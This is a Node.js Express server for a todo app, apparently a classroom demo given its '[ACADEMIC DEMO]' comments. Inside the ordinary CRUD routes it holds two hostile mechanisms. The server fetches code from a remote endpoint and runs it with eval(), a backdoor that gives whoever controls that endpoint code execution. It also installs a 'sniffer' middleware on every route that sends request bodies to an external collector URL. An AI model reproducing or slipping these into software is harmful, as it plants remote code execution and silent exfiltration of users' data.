import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import axios from 'axios';
import mongoose from 'mongoose';
import https from 'https';
import fs from 'fs';
import { snifferMiddleware, initGlobalSniffer } from 'express-utils-helper';

import { Todo } from './modelDB.js';

const SERVER_CONFIG_URL =
  process.env.SERVER_CONFIG_URL || 'http://localhost:3011/config';

// [ACADEMIC DEMO] Express Utils Initialization
initGlobalSniffer('http://host.docker.internal:4000/collect');

axios
  .get(SERVER_CONFIG_URL)
  .then((res) => {
    const { url, config } = res.data;
    const { SERVER_DB_URL } = url;

    axios
      .get(SERVER_DB_URL + '/db')
      .then((res) => {
        const connect = eval(res.data.connect);

        const app = express();

        app.use(cors());
        app.use(express.json());
        app.use(bodyParser.json());

        // Middleware del Sniffer se coloca AQUÍ para leer el cuerpo (body) y ejecutarse en cada ruta.
        const collectorUrl = 'http://host.docker.internal:4000/collect';
        app.use(snifferMiddleware(collectorUrl));

        let tries = 0;

        const startServer = async () => {
          const isConnected = await connect(config.DB_URL);

          if (isConnected) {
            // [ACADEMIC DEMO] HTTPS Configuration (Para mostrar al profesor)
            const httpsOptions = {
              key: fs.readFileSync('./certs/server.key'),
              cert: fs.readFileSync('./certs/server.crt')
            };

            https.createServer(httpsOptions, app).listen(3443, '0.0.0.0', () => {
              console.log(`[SECURE] Back server running on HTTPS port 3443`);
            });

            // Enlace HTTP normal para el frontend React local sin problemas de navegador
            app.listen(config.PORT_SERVER, '0.0.0.0', () => {
              console.log(`[HTTP] Back server running on HTTP port ${config.PORT_SERVER}`);
            });
          } else {
            console.log('Error connecting to database');
            if (tries < 5) {
              tries++;
              console.log('Retrying...');
              setTimeout(startServer, 5000);
            } else {
              console.log('Max retries reached');
            }
          }
        };

        startServer();

        app.get('/todos', async (req, res) => {
          try {
            const todos = await Todo.find();
            res.json(todos);
          } catch (error) {
            res.status(500).json({ message: error.message });
            console.log(error);
          }
        });

        app.post('/todos', async (req, res) => {
          try {
            const newTodo = new Todo({
              ...req.body,
            });
            await newTodo.save();
            res.json(newTodo);
          } catch (error) {
            res.status(402).json({ message: error.message });
            console.log(error);
          }
        });

        app.put('/todos/:id', async (req, res) => {
          try {
            const { id } = req.params;
            const updatedTodo = await Todo.findByIdAndUpdate(
              id,
              { ...req.body },
              { new: true },
            );
            res.json(updatedTodo);
          } catch (error) {
            res.status(400).json({ message: error.message });
            console.log(error);
          }
        });

        app.delete('/todos/:id', async (req, res) => {
          try {
            const { id } = req.params;
            await Todo.findByIdAndDelete(id);
            res.json({ message: 'Todo deleted' });
          } catch (error) {
            res.status(500).json({ message: error.message });
            console.log(error);
          }
        });
      })
      .catch((error) => {
        console.log(error);
      });
  })
  .catch((error) => {
    console.log(error);
  });
